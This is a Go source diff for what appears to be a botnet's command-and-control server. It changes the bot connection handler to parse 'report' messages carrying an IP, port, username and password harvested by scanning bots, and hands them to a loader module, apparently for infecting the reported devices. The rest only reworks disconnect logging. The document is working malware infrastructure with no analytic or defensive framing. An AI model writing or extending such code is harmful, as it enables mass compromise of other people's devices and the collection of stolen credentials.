@@ -2,6 +2,7 @@ package bot
 
 import (
 	"bufio"
+	"cnc/internal/loader"
 	"cnc/internal/logger"
 	"cnc/internal/models"
 	"cnc/internal/state"
@@ -111,31 +112,44 @@ func BotListener(port int) {
 }
 
 func handleBot(bot *models.Bot) {
+	botIP := bot.Ip
+	botArch := bot.Arch
+
 	defer func() {
 		state.BotMutex.Lock()
 		bot.IsValid = false
 		bot.Conn.Close()
 		state.BotMutex.Unlock()
 
-		ip := bot.Conn.RemoteAddr().(*net.TCPAddr).IP.String()
-		cause := "EOF"
-		logger.LogBotDisconnect(cause, bot.Arch, ip)
+		logger.LogBotDisconnect("EOF", botArch, botIP)
 	}()
 
 	reader := bufio.NewReader(bot.Conn)
 	for {
 		bot.Conn.SetReadDeadline(time.Now().Add(45 * time.Second))
-		_, err := reader.ReadString('\n')
+		line, err := reader.ReadString('\n')
 		if err != nil {
-			ip := bot.Conn.RemoteAddr().(*net.TCPAddr).IP.String()
 			cause := "EOF"
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				cause = "Timeout"
 			} else if err != io.EOF {
 				cause = err.Error()
 			}
-			logger.LogBotDisconnect(cause, bot.Arch, ip)
+			logger.LogBotDisconnect(cause, botArch, botIP)
 			return
+		}
+
+		line = strings.TrimSpace(line)
+
+		// handle scanner reports: "report <ip>:<port> <user> <pass>"
+		if strings.HasPrefix(line, "report ") {
+			parts := strings.Fields(line)
+			if len(parts) >= 4 {
+				addrParts := strings.SplitN(parts[1], ":", 2)
+				if len(addrParts) == 2 {
+					loader.AddCredential(addrParts[0], addrParts[1], parts[2], parts[3])
+				}
+			}
 		}
 	}
 }
